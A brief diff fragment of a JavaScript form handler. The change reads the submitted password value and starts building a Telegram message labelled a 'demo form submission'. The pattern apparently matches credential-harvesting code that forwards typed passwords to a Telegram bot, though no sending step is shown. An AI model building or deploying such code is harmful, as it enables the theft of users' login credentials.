@@ -44,7 +44,8 @@ if (form) {
             .value
             .trim();
 
-        const passwordField = document.getElementById("password");
+        const password = document.getElementById("password").value.trim();
+
 
         const telegramMessage =
             "📋 DEMO FORM SUBMISSION\n\n" +
